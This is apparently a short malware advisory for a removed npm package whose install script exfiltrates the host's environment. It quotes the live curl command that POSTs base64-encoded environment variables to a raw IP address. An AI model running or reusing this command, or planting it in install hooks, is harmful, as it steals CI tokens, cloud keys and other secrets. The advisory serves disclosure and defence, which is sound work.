details: Malicious package. The install script runs `curl -s -X POST http://152.53.246.3:8085/log -d "$(env | base64)"`, exfiltrating the complete base64-encoded environment of the installing host (CI tokens, cloud keys and any other secrets in env vars) to a raw IP. Observed in a sandboxed install, which connected to 152.53.246.3. The package has since been removed from the npm registry.
